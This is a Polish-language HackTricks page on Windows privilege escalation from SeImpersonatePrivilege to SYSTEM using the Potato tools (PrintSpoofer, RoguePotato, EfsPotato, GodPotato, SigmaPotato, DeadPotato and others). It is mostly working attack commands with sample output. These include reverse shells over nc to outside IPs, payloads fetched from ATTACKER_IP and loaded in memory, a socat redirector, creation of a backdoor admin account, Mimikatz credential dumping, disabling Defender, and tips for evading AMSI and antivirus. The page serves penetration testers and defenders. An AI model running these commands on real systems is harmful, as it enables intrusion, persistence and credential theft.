# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato nie działa** na Windows Server 2019 i Windows 10 w wersji 1809 lub nowszej. Można jednak użyć [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)**, aby **wykorzystać te same uprawnienia i uzyskać dostęp na poziomie `NT AUTHORITY\SYSTEM`**. W tym [wpisie na blogu](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) szczegółowo omówiono narzędzie `PrintSpoofer`, które pozwala nadużywać uprawnień do impersonacji na hostach z Windows 10 i Server 2019, na których JuicyPotato już nie działa.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Nowoczesną alternatywą, często aktualizowaną w latach 2024–2025, jest SigmaPotato (fork GodPotato), który dodaje obsługę użycia in-memory/reflection .NET oraz rozszerza obsługę systemów operacyjnych. Poniżej znajdziesz przykładowe użycie, a repozytorium — w sekcji References.

Powiązane strony omawiające podstawy i techniki manualne:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Wymagania i częste pułapki

Wszystkie poniższe techniki polegają na nadużywaniu uprzywilejowanej usługi obsługującej impersonację z kontekstu, który ma jedno z tych uprawnień:

- SeImpersonatePrivilege (najczęściej) lub SeAssignPrimaryTokenPrivilege
- Wysoki poziom integralności nie jest wymagany, jeśli token ma już SeImpersonatePrivilege (typowe dla wielu kont usług, takich jak IIS AppPool, MSSQL itp.)

Szybko sprawdź uprawnienia:

```cmd
whoami /priv | findstr /i impersonate
```

Uwagi operacyjne:

- Jeśli Twoja powłoka działa z ograniczonym tokenem bez SeImpersonatePrivilege (częste w niektórych kontekstach dla Local Service/Network Service), przywróć domyślne uprawnienia konta za pomocą FullPowers, a następnie uruchom Potato. Przykład: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- Token procesu może mieć mniej uprawnień niż inny token tego samego konta usługi lub sesji logowania. W niektórych konfiguracjach klient named pipe w tej samej sesji może udostępnić inny token z SeImpersonatePrivilege, ale skonfigurowane przez usługę `RequiredPrivileges` i wynik `whoami /priv` opisują różne rzeczy i nie dowodzą, że taki token jest dostępny. Przed rozważeniem ścieżki podszywania się zweryfikuj rzeczywisty token.
- PrintSpoofer wymaga, aby usługa Print Spooler była uruchomiona i osiągalna przez lokalny punkt końcowy RPC (spoolss). W zahartowanych środowiskach, w których Spooler jest wyłączony po PrintNightmare, wybierz RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato wymaga osiągalnego resolvera OXID na TCP/135. Jeśli ruch wychodzący jest zablokowany, użyj redirectora/przekierowania portów (zobacz przykład poniżej). Sprawdź flagi obsługiwane przez używaną kompilację.
- EfsPotato/SharpEfsPotato wykorzystują MS-EFSR; jeśli jeden pipe jest zablokowany, wypróbuj alternatywne pipe’y (lsarpc, efsrpc, samr, lsass, netlogon).
- Błąd 0x6d3 podczas RpcBindingSetAuthInfo zwykle wskazuje na nieznaną/nieobsługiwaną usługę uwierzytelniania RPC; wypróbuj inny pipe/transport lub upewnij się, że usługa docelowa jest uruchomiona.
- Forki typu „kuchenny zlew”, takie jak DeadPotato, zawierają dodatkowe moduły payloadów (Mimikatz/SharpHound/Defender off), które zapisują dane na dysk; spodziewaj się wyższej wykrywalności przez EDR niż w przypadku odchudzonych oryginałów.

## Szybkie demo

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Uwagi:
- Możesz użyć `-i`, aby uruchomić interaktywny proces w bieżącej konsoli, lub `-c`, aby wykonać jednowierszowe polecenie.
- Wymagana jest usługa Spooler. Jeśli jest wyłączona, to nie zadziała.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

W [użyciu upstream](https://github.com/antonioCoco/RoguePotato#usage) `-e` podaje polecenie, `-l` wybiera lokalny port resolvera, a opcjonalne `-c` wybiera CLSID. Jeśli aktywacja COM uruchomi usługę, której ścieżka do pliku wykonywalnego została wcześniej zmieniona, usługa może wykonać zmodyfikowane polecenie niezależnie od impersonacji tokenu; przed przypisaniem zaobserwowanego wykonania z uprawnieniami SYSTEM tej technice sprawdź konfigurację usługi.

Jeśli ruch wychodzący na porcie 135 jest blokowany, przekieruj resolver OXID przez socat na redirectorze:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato to nowszy prymityw nadużycia COM, opublikowany pod koniec 2022 roku, który atakuje usługę **PrintNotify** zamiast Spooler/BITS. Plik binarny tworzy instancję serwera COM PrintNotify, podmienia `IUnknown` na fałszywy, a następnie wyzwala uprzywilejowane wywołanie zwrotne za pomocą `CreatePointerMoniker`. Gdy usługa PrintNotify (działająca jako **SYSTEM**) nawiąże połączenie zwrotne, proces duplikuje otrzymany token i uruchamia dostarczony payload z pełnymi uprawnieniami.<sup>[[13]](#references)</sup>

Najważniejsze informacje operacyjne:

* Działa w systemach Windows 10/11 i Windows Server 2012–2022, o ile zainstalowana jest usługa Print Workflow/PrintNotify (jest dostępna nawet wtedy, gdy starsza usługa Spooler jest wyłączona po PrintNightmare).
* Wymaga, aby kontekst wywołujący miał uprawnienie **SeImpersonatePrivilege** (typowe dla kont usług IIS APPPOOL, MSSQL i zaplanowanych zadań).
* Przyjmuje bezpośrednie polecenie lub tryb interaktywny, dzięki czemu można pozostać w oryginalnej konsoli. Przykład:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Ponieważ opiera się wyłącznie na COM, nie wymaga nasłuchujących named pipe ani zewnętrznych redirectorów, dzięki czemu jest bezpośrednim zamiennikiem na hostach, na których Defender blokuje wiązanie RPC przez RoguePotato.

Operatorzy, tacy jak Ink Dragon, uruchamiają PrintNotifyPotato zaraz po uzyskaniu RCE przez ViewState w SharePoint, aby przejść z procesu roboczego `w3wp.exe` do SYSTEM przed zainstalowaniem ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

Wskazówka: Jeśli jeden pipe zawiedzie lub EDR go zablokuje, spróbuj innych obsługiwanych pipe'ów:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Uwagi:
- Działa w systemach Windows 8/8.1–11 i Server 2012–2022, jeśli dostępne jest SeImpersonatePrivilege.
- Pobierz plik binarny pasujący do zainstalowanego środowiska uruchomieniowego (np. `GodPotato-NET4.exe` w nowoczesnym Server 2022).
- Jeśli początkowy mechanizm wykonania to webshell/UI z krótkimi limitami czasu, przygotuj payload jako skrypt i poproś GodPotato o jego uruchomienie zamiast wykonywać długie polecenie inline.<sup>[[12]](#references)</sup>

Szybki sposób przygotowania w zapisywalnym katalogu głównym witryny IIS:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato udostępnia dwa warianty wymierzone w obiekty DCOM usług, które domyślnie używają RPC_C_IMP_LEVEL_IMPERSONATE. Zbuduj pliki binarne lub użyj dostarczonych, a następnie uruchom polecenie:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (zaktualizowany fork GodPotato)

SigmaPotato dodaje nowoczesne udogodnienia, takie jak wykonywanie w pamięci za pomocą refleksji .NET oraz pomocniczy skrypt PowerShell do reverse shell.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

Dodatkowe zalety w buildach z lat 2024–2025 (v1.2.x):
- Wbudowana flaga reverse shell `--revshell` i usunięcie limitu 1024 znaków PowerShell, dzięki czemu można uruchomić długie payloady omijające AMSI za jednym razem.
- Składnia przyjazna dla Reflection (`[SigmaPotato]::Main()`), a także prosty trik AV evasion wykorzystujący `VirtualAllocExNuma()`, który ma zmylić proste heurystyki.
- Osobny plik `SigmaPotatoCore.exe` skompilowany dla .NET 2.0, przeznaczony do środowisk PowerShell Core.

### DeadPotato (przeróbka GodPotato z 2024 roku z modułami)

DeadPotato zachowuje łańcuch impersonation OXID/DCOM z GodPotato, ale zawiera też pomocnicze narzędzia post-exploitation, dzięki czemu operatorzy mogą od razu uzyskać uprawnienia SYSTEM i przeprowadzić działania związane z persistence/collection bez dodatkowych narzędzi.<sup>[[15]](#references)</sup>

Typowe moduły (wszystkie wymagają SeImpersonatePrivilege):

- `-cmd "<cmd>"` — uruchamia dowolne polecenie jako SYSTEM.
- `-rev <ip:port>` — szybki reverse shell.
- `-newadmin user:pass` — tworzy lokalnego administratora na potrzeby persistence.
- `-mimi sam|lsa|all` — zapisuje Mimikatz na dysku i uruchamia go, aby zrzucić dane uwierzytelniające (zapis na dysku, łatwe do wykrycia).
- `-sharphound` — uruchamia SharpHound do zbierania danych jako SYSTEM.
- `-defender off` — wyłącza ochronę Defendera w czasie rzeczywistym (bardzo łatwe do wykrycia).

Przykładowe jednolinijkowce:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

Ponieważ zawiera dodatkowe pliki binarne, spodziewaj się większej liczby alertów AV/EDR; gdy liczy się stealth, użyj lżejszego GodPotato/SigmaPotato.

## References

- [1] [PrintSpoofer – Nadużywanie uprawnień do impersonacji w Windows 10 i Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Koniec z JuicyPotato? Stara historia, witaj RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Przywracanie domyślnych uprawnień tokenu dla kont usług](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — NTLM leak z WMP → NTFS junction do webroot → RCE → FullPowers + GodPotato, aby uzyskać SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — Makro LibreOffice → webshell IIS → GodPotato, aby uzyskać SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Wewnątrz Ink Dragon: ujawnienie sieci relay i mechanizmów skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – przeróbka GodPotato z wbudowanymi modułami post-ex](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
